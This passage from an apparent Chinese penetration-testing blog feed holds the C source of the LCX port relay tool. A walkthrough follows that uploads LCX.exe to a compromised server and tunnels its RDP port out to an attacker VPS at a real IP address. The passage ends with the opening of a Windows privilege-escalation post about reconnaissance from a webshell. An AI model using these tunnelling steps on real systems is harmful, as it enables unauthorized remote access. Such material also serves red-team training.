*)&amp;size2))&lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;accept2 error&quot;</span>);</span><br><span class="line">            close(sockfd1);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept a client on port %d from %s\n&quot;</span>,port2,inet_ntoa(client2.sin_addr));</span><br><span class="line">        pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(pid==<span class="number">0</span>) transdata(sockfd1,sockfd2);</span><br><span class="line">        <span class="comment">//sleep(2);</span></span><br><span class="line">        close(sockfd1);</span><br><span class="line">        close(sockfd2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conn2conn</span><span class="params">(<span class="keyword">char</span> *host1,<span class="keyword">int</span> port1,<span class="keyword">char</span> *host2,<span class="keyword">int</span> port2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sockfd1,sockfd2;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    fd_set fds;</span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    <span class="keyword">int</span> result;</span><br><span class="line">    <span class="keyword">char</span> buffer[MAXSIZE];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((sockfd1=create_socket())==<span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>((sockfd2=create_socket())==<span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] make a connection to %s:%d....\r\n&quot;</span>,host1,port1);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">if</span>(client_connect(sockfd1,host1,port1)==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] connect to host1 failed\r\n&quot;</span>);</span><br><span class="line">            close(sockfd1);</span><br><span class="line">            close(sockfd2);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] host1 connected\r\n&quot;</span>);</span><br><span class="line">        l=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(buffer,<span class="number">0</span>,MAXSIZE);</span><br><span class="line">        <span class="comment">//fixed by Twi1ight 2012.09.12</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            FD_ZERO(&amp;fds);</span><br><span class="line">            FD_SET(sockfd1, &amp;fds);</span><br><span class="line">            <span class="keyword">if</span> (select(sockfd1+<span class="number">1</span>, &amp;fds, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>) &lt; <span class="number">0</span> ) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (errno == EINTR) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (FD_ISSET(sockfd1, &amp;fds)) </span><br><span class="line">            &#123;</span><br><span class="line">                l=read(sockfd1, buffer, MAXSIZE);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=<span class="number">0</span>) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] there is a error...Create a new connection.\r\n&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] make a connection to %s:%d....\r\n&quot;</span>,host2,port2);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="keyword">if</span>(client_connect(sockfd2,host2,port2)==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[-] connect to host2 failed\r\n&quot;</span>);</span><br><span class="line">                close(sockfd1);</span><br><span class="line">                close(sockfd2);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(write(sockfd2,buffer,l) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123; </span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[-] send failed.\r\n&quot;</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            l=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">memset</span>(buffer,<span class="number">0</span>,MAXSIZE);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] all hosts connected!\r\n&quot;</span>);</span><br><span class="line">        pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(pid==<span class="number">0</span>) transdata(sockfd1,sockfd2);</span><br><span class="line">        <span class="comment">//sleep(2);</span></span><br><span class="line">        close(sockfd1);</span><br><span class="line">        close(sockfd2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transdata</span><span class="params">(<span class="keyword">int</span> fd1,<span class="keyword">int</span> fd2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">timeset</span>;</span></span><br><span class="line">    fd_set readfd,writefd;</span><br><span class="line">    <span class="keyword">int</span> result,i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> read_in1[MAXSIZE],send_out1[MAXSIZE];</span><br><span class="line">    <span class="keyword">char</span> read_in2[MAXSIZE],send_out2[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> read1=<span class="number">0</span>,totalread1=<span class="number">0</span>,send1=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> read2=<span class="number">0</span>,totalread2=<span class="number">0</span>,send2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> sendcount1,sendcount2;</span><br><span class="line">    <span class="keyword">int</span> maxfd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">client1</span>,<span class="title">client2</span>;</span></span><br><span class="line">    <span class="keyword">int</span> structsize1,structsize2;</span><br><span class="line">    <span class="keyword">char</span> host1[<span class="number">20</span>],host2[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">int</span> port1=<span class="number">0</span>,port2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> tmpbuf1[<span class="number">100</span>],tmpbuf2[<span class="number">100</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">memset</span>(host1,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    <span class="built_in">memset</span>(host2,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">    <span class="built_in">memset</span>(tmpbuf1,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(tmpbuf2,<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        structsize1=<span class="keyword">sizeof</span>(struct sockaddr);</span><br><span class="line">        structsize2=<span class="keyword">sizeof</span>(struct sockaddr);</span><br><span class="line">        <span class="keyword">if</span>(getpeername(fd1,(struct sockaddr *)&amp;client1,(<span class="keyword">socklen_t</span> *)&amp;structsize1)&lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(host1,<span class="string">&quot;fd1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;got,ip:%s,port:%d\r\n&quot;</span>,inet_ntoa(client1.sin_addr),ntohs(client1.sin_port));</span><br><span class="line">            <span class="built_in">strcpy</span>(host1,inet_ntoa(client1.sin_addr));</span><br><span class="line">            port1=ntohs(client1.sin_port);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(getpeername(fd2,(struct sockaddr *)&amp;client2,(<span class="keyword">socklen_t</span> *)&amp;structsize2)&lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(host2,<span class="string">&quot;fd2&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;got,ip:%s,port:%d\r\n&quot;</span>,inet_ntoa(client2.sin_addr),ntohs(client2.sin_port));</span><br><span class="line">            <span class="built_in">strcpy</span>(host2,inet_ntoa(client2.sin_addr));</span><br><span class="line">            port2=ntohs(client2.sin_port);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sprintf</span>(tmpbuf1,<span class="string">&quot;\r\n########### read from %s:%d ####################\r\n&quot;</span>,host1,port1);</span><br><span class="line">        <span class="built_in">sprintf</span>(tmpbuf2,<span class="string">&quot;\r\n########### reply from %s:%d ####################\r\n&quot;</span>,host2,port2);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    maxfd=max(fd1,fd2)+<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(read_in1,<span class="number">0</span>,MAXSIZE);</span><br><span class="line">    <span class="built_in">memset</span>(read_in2,<span class="number">0</span>,MAXSIZE);</span><br><span class="line">    <span class="built_in">memset</span>(send_out1,<span class="number">0</span>,MAXSIZE);</span><br><span class="line">    <span class="built_in">memset</span>(send_out2,<span class="number">0</span>,MAXSIZE);</span><br><span class="line"> </span><br><span class="line">    timeset.tv_sec=TIMEOUT;</span><br><span class="line">    timeset.tv_usec=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        FD_ZERO(&amp;readfd);</span><br><span class="line">        FD_ZERO(&amp;writefd);</span><br><span class="line"> </span><br><span class="line">        FD_SET(fd1,&amp;readfd);</span><br><span class="line">        FD_SET(fd1,&amp;writefd);</span><br><span class="line">        FD_SET(fd2,&amp;writefd);</span><br><span class="line">        FD_SET(fd2,&amp;readfd);</span><br><span class="line"> </span><br><span class="line">        result=select(maxfd,&amp;readfd,&amp;writefd,<span class="literal">NULL</span>,&amp;timeset);</span><br><span class="line">        <span class="keyword">if</span>((result&lt;<span class="number">0</span>) &amp;&amp; (errno!=EINTR))</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;select error&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(result==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;time out\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(FD_ISSET(fd1,&amp;readfd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 不能超过MAXSIZE-totalread1,不然send_out1会溢出 */</span></span><br><span class="line">            <span class="keyword">if</span>(totalread1&lt;MAXSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">                read1=read(fd1,read_in1,MAXSIZE-totalread1);</span><br><span class="line">                <span class="keyword">if</span>(read1==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span>((read1&lt;<span class="number">0</span>) &amp;&amp; (errno!=EINTR))</span><br><span class="line">                &#123;</span><br><span class="line">                    perror(<span class="string">&quot;read data error&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">memcpy</span>(send_out1+totalread1,read_in1,read1);</span><br><span class="line">                makelog(tmpbuf1,<span class="built_in">strlen</span>(tmpbuf1));</span><br><span class="line">                makelog(read_in1,read1);</span><br><span class="line">                totalread1+=read1;</span><br><span class="line">                <span class="built_in">memset</span>(read_in1,<span class="number">0</span>,MAXSIZE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(FD_ISSET(fd2,&amp;writefd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> err=<span class="number">0</span>;</span><br><span class="line">            sendcount1=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(totalread1&gt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                send1=write(fd2,send_out1+sendcount1,totalread1);</span><br><span class="line">                <span class="keyword">if</span>(send1==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span>((send1&lt;<span class="number">0</span>) &amp;&amp; (errno!=EINTR))</span><br><span class="line">                &#123;</span><br><span class="line">                    perror(<span class="string">&quot;unknow error&quot;</span>);</span><br><span class="line">                    err=<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>((send1&lt;<span class="number">0</span>) &amp;&amp; (errno==ENOSPC)) <span class="keyword">break</span>;</span><br><span class="line">                sendcount1+=send1;</span><br><span class="line">                totalread1-=send1;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(err==<span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span>((totalread1&gt;<span class="number">0</span>) &amp;&amp; (sendcount1&gt;<span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">/* 移动未发送完的数据到开始 */</span></span><br><span class="line">                <span class="built_in">memcpy</span>(send_out1,send_out1+sendcount1,totalread1);</span><br><span class="line">                <span class="built_in">memset</span>(send_out1+totalread1,<span class="number">0</span>,MAXSIZE-totalread1);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">memset</span>(send_out1,<span class="number">0</span>,MAXSIZE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(FD_ISSET(fd2,&amp;readfd))</span><br><span class="line">        &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(totalread2&lt;MAXSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">                read2=read(fd2,read_in2,MAXSIZE-totalread2);</span><br><span class="line">                <span class="keyword">if</span>(read2==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span>((read2&lt;<span class="number">0</span>) &amp;&amp; (errno!=EINTR))</span><br><span class="line">                &#123;</span><br><span class="line">                    perror(<span class="string">&quot;read data error&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">memcpy</span>(send_out2+totalread2,read_in2,read2);</span><br><span class="line">                makelog(tmpbuf2,<span class="built_in">strlen</span>(tmpbuf2));</span><br><span class="line">                makelog(read_in2,read2);</span><br><span class="line">                totalread2+=read2;</span><br><span class="line">                <span class="built_in">memset</span>(read_in2,<span class="number">0</span>,MAXSIZE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(FD_ISSET(fd1,&amp;writefd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> err2=<span class="number">0</span>;</span><br><span class="line">            sendcount2=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(totalread2&gt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                send2=write(fd1,send_out2+sendcount2,totalread2);</span><br><span class="line">                <span class="keyword">if</span>(send2==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span>((send2&lt;<span class="number">0</span>) &amp;&amp; (errno!=EINTR))</span><br><span class="line">                &#123;</span><br><span class="line">                    perror(<span class="string">&quot;unknow error&quot;</span>);</span><br><span class="line">                    err2=<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>((send2&lt;<span class="number">0</span>) &amp;&amp; (errno==ENOSPC)) <span class="keyword">break</span>;</span><br><span class="line">                sendcount2+=send2;</span><br><span class="line">                totalread2-=send2;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(err2==<span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span>((totalread2&gt;<span class="number">0</span>) &amp;&amp; (sendcount2 &gt; <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">/* 移动未发送完的数据到开始 */</span></span><br><span class="line">                <span class="built_in">memcpy</span>(send_out2,send_out2+sendcount2,totalread2);</span><br><span class="line">                <span class="built_in">memset</span>(send_out2+totalread2,<span class="number">0</span>,MAXSIZE-totalread2);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">memset</span>(send_out2,<span class="number">0</span>,MAXSIZE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    close(fd1);</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ok,I closed the two fd\r\n&quot;</span>);</span><br><span class="line">    <span class="comment">//exit(0);</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">closeallfd</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Let me exit...&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">3</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(fp,<span class="string">&quot;exited\r\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;all overd\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">makelog</span><span class="params">(<span class="keyword">char</span> *buffer,<span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(fp !=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//fprintf(fp,&quot;%s&quot;,buffer);</span></span><br><span class="line">        write(fileno(fp),buffer,length);</span><br><span class="line">        fflush(fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_socket</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sockfd;</span><br><span class="line"> </span><br><span class="line">    sockfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sockfd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;create socket error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>(sockfd);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_serv</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srvaddr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> on=<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    bzero(&amp;srvaddr,<span class="keyword">sizeof</span>(struct sockaddr));</span><br><span class="line">    srvaddr.sin_port=htons(port);</span><br><span class="line">    srvaddr.sin_family=AF_INET;</span><br><span class="line">    srvaddr.sin_addr.s_addr=htonl(INADDR_ANY);</span><br><span class="line"> </span><br><span class="line">    setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&amp;on,<span class="keyword">sizeof</span>(on)); <span class="comment">//so I can rebind the port</span></span><br><span class="line">    <span class="keyword">if</span>(bind(sockfd,(struct sockaddr *)&amp;srvaddr,<span class="keyword">sizeof</span>(struct sockaddr))&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(listen(sockfd,CONNECT_NUMBER)&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;listen error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">client_connect</span><span class="params">(<span class="keyword">int</span> sockfd,<span class="keyword">char</span>* server,<span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cliaddr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(host=gethostbyname(server)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;gethostbyname(%s) error:%s\n&quot;</span>,server,strerror(errno));</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    bzero(&amp;cliaddr,<span class="keyword">sizeof</span>(struct sockaddr));</span><br><span class="line">    cliaddr.sin_family=AF_INET;</span><br><span class="line">    cliaddr.sin_port=htons(port);</span><br><span class="line">    cliaddr.sin_addr=*((struct in_addr *)host-&gt;h_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(connect(sockfd,(struct sockaddr *)&amp;cliaddr,<span class="keyword">sizeof</span>(struct sockaddr))&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="LCX的用法"><a href="#LCX的用法" class="headerlink" title="LCX的用法"></a>LCX的用法</h2><p>如果是用的是阿里云的VPS，那么必须设置一下<code>安全组规则</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/386.png" alt="图片"></p><p>然后在VPS运行：</p><blockquote><p>./lcx</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/383.png" alt="图片"></p><p>OK!那么先是在对方服务器上传一个<code>LCX.exe</code>:</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/384.png" alt="图片"></p><p>运行OK!</p><p>首先在<code>VPS</code>上想要监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-m 是指在这台VPS上做为监听 2是指吧哪个监听的端口转发为你指定的端口上去</span><br><span class="line"></span><br><span class="line">./lcx -m 2 -p1 [监听的端口] -p2 [吧监听的端口转发到哪个端口去]</span><br></pre></td></tr></table></figure><p>示范：吧8082端口转发到999端口上去</p><blockquote><p>./lcx -m 2 -p1 8082 -p2 999</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/385.png" alt="图片"></p><p>这个时候就正在监听<code>8082</code>端口!</p><p>lcx.exe -slave [VPS的IP] [VPS的监听端口:也就是8082] [本机的IP:127.0.0.1] [目标服务器需要转发的端口]</p><blockquote><p>lcx.exe -slave 120.79.76.164 8082 127.0.0.1 3389</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/387.png" alt="图片"></p><p>可以看到有变动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@iZoozta5ri0vq7Z:~/hacker/lcx-port# ./lcx -m 2 -p1 8082 -p2 999</span><br><span class="line">binding port 8082......ok</span><br><span class="line">binding port 999......ok</span><br><span class="line">waiting for response on port 8082.........</span><br><span class="line">accept a client on port 8082 from 1.xxx.xxx.89,waiting another on port 999....</span><br></pre></td></tr></table></figure><p>这边提示已经连接，正在等待另一个端口！</p><p>这个时候就可以远程登录了，连接的时候填写的是VPS的IP:</p><blockquote><p>120.79.76.164:999</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/388.png" alt="图片"></p><p>这边就可以实现登录到目标远程桌面了!</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/389.png" alt="图片"></p><p>由于我给的<code>Win7</code>虚拟机的配置太小了，所以就…大家懂这个操作就OK！</p><p>目前端口转发<code>LCX</code>使用就到这</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后渗透 </tag>
            
            <tag> 红队攻防 </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权之本地提权-信息搜集</title>
      <link href="/2019/10/07/red-hack-2/"/>
      <url>/2019/10/07/red-hack-2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=555853&auto=1&height=66"></iframe><h2 id="提权简介"><a href="#提权简介" class="headerlink" title="提权简介"></a>提权简介</h2><p>在渗透过程中，通过各种方式获取到一枚<code>cmdshell</code>，但是这个<code>cmdshell</code>的权限相对比较低，无法让我们做我们想做的事情，<br>比如获取系统密码，比如获取数据库信息，比如拿到服务器中的另一个站点的权限那么这个时候就需要对当前的<code>cmdshell</code>进行<code>权限的提升</code>，整个过程叫：权限提升，简称提权</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><blockquote><p>假设我们现在已经获取到了一枚WebShell，我们需要对目标进行信息收集</p></blockquote><h4 id="查看当前系统版本"><a href="#查看当前系统版本" class="headerlink" title="查看当前系统版本"></a>查看当前系统版本</h4><blockquote><p>ver //查看当前系统版本</p></blockquote><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/364.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; ver</span><br><span class="line"></span><br><span class="line">Microsoft Windows [版本 6.1.7601]</span><br></pre></td></tr></table></figure><blockquote><p>systeminfo //则查看的信息就比较详细</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\bjgs_v2.1\&gt; 